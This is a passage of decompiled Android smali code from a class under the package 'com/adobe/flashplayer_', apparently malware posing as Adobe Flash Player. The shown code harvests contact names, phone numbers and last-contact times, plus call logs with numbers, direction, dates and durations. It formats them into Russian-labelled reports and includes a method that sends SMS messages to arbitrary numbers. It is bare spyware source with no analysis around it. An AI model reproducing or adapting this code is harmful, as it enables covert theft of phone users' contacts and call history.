    .end local v51    # "pack_inbox_pack":Ljava/lang/String;
    .end local v52    # "pack_outbox":Ljava/lang/String;
    .end local v53    # "pack_outbox_pack":Ljava/lang/String;
    .end local v60    # "sender":Ljava/lang/String;
    .restart local v31    # "data":Ljava/lang/String;
    .restart local v57    # "phones":Landroid/database/Cursor;
    .restart local v63    # "temp_Z":Ljava/lang/String;
    :cond_1a
    const-string v3, "display_name"

    move-object/from16 v0, v57

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v57

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v46

    .line 333
    .local v46, "name":Ljava/lang/String;
    const-string v3, "data1"

    move-object/from16 v0, v57

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v57

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v56

    .line 334
    .local v56, "phone":Ljava/lang/String;
    const-string v3, "last_time_contacted"

    move-object/from16 v0, v57

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v57

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v29

    .line 336
    .local v29, "contacted":Ljava/lang/String;
    invoke-static/range {v29 .. v29}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v40

    .line 338
    .local v40, "gmt_time":J
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v63 .. v63}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "[ \u0418\u043c\u044f ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v46

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r[ \u0422\u0435\u043b\u0435\u0444\u043e\u043d ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v56

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r[ \u041f\u043e\u0441\u043b\u0435\u0434\u043d\u044f\u044f \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u044c ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-static/range {v40 .. v41}, Lcom/adobe/flashplayer_/BBB;->millisToDate(J)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v63

    .line 339
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v63 .. v63}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "........................\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v63

    goto/16 :goto_6

    .line 367
    .end local v29    # "contacted":Ljava/lang/String;
    .end local v31    # "data":Ljava/lang/String;
    .end local v40    # "gmt_time":J
    .end local v46    # "name":Ljava/lang/String;
    .end local v56    # "phone":Ljava/lang/String;
    .end local v57    # "phones":Landroid/database/Cursor;
    .end local v63    # "temp_Z":Ljava/lang/String;
    .local v32, "date":I
    .restart local v36    # "duration":I
    .restart local v43    # "managedCursor":Landroid/database/Cursor;
    .restart local v48    # "number":I
    .restart local v59    # "sb":Ljava/lang/StringBuffer;
    .restart local v66    # "type":I
    :cond_1b
    move-object/from16 v0, v43

    move/from16 v1, v48

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v55

    .line 368
    .local v55, "phNumber":Ljava/lang/String;
    move-object/from16 v0, v43

    move/from16 v1, v66

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v26

    .line 369
    .local v26, "callType":Ljava/lang/String;
    move-object/from16 v0, v43

    move/from16 v1, v32

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v23

    .line 370
    .local v23, "callDate":Ljava/lang/String;
    new-instance v24, Ljava/util/Date;

    invoke-static/range {v23 .. v23}, Ljava/lang/Long;->valueOf(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Long;->longValue()J

    move-result-wide v7

    move-object/from16 v0, v24

    invoke-direct {v0, v7, v8}, Ljava/util/Date;-><init>(J)V

    .line 371
    .local v24, "callDayTime":Ljava/util/Date;
    move-object/from16 v0, v43

    move/from16 v1, v36

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v25

    .line 372
    .local v25, "callDuration":Ljava/lang/String;
    const/16 v34, 0x0

    .line 373
    .local v34, "dir":Ljava/lang/String;
    invoke-static/range {v26 .. v26}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v35

    .line 374
    .local v35, "dircode":I
    packed-switch v35, :pswitch_data_0

    .line 387
    :goto_8
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v34 .. v34}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, v59

    invoke-virtual {v0, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 388
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "\u0422\u0435\u043b\u0435\u0444\u043e\u043d: "

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v55

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\u0414\u0430\u0442\u0430: "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v24

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\u0412\u0440\u0435\u043c\u044f \u0440\u0430\u0437\u0433\u043e\u0432\u043e\u0440\u0430: "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v25

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, " \u0441\u0435\u043a\u0443\u043d\u0434.\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, v59

    invoke-virtual {v0, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 389
    const-string v3, "\r\r\r"

    move-object/from16 v0, v59

    invoke-virtual {v0, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    goto/16 :goto_7

    .line 376
    :pswitch_0
    const-string v34, "\u0418\u0441\u0445\u043e\u0434\u044f\u0449\u0438\u0439 \u0437\u0432\u043e\u043d\u043e\u043a"

    .line 377
    goto :goto_8

    .line 380
    :pswitch_1
    const-string v34, "\u0412\u0445\u043e\u0434\u044f\u0449\u0438\u0435 \u0437\u0432\u043e\u043d\u043e\u043a"

    .line 381
    goto :goto_8

    .line 384
    :pswitch_2
    const-string v34, "\u041f\u0440\u043e\u043f\u0443\u0449\u0435\u043d\u043d\u044b\u0439 \u0437\u0432\u043e\u043d\u043e\u043a"

    goto :goto_8

    .line 374
    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_1
        :pswitch_0
        :pswitch_2
    .end packed-switch
.end method

.method public onDestroy()V
    .locals 0

    .prologue
    .line 774
    return-void
.end method

.method public sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
    .param p1, "n"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 635
    move-object v1, p1

    .line 636
    .local v1, "phoneNumber":Ljava/lang/String;
    move-object v6, p2

    .line 637
    .local v6, "message":Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 638
    .local v0, "smsManager":Landroid/telephony/SmsManager;
    invoke-virtual {v0, v6}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    .local v3, "parts":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    move-object v4, v2

    move-object v5, v2

    .line 639
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    .line 640
    return-void
.end method
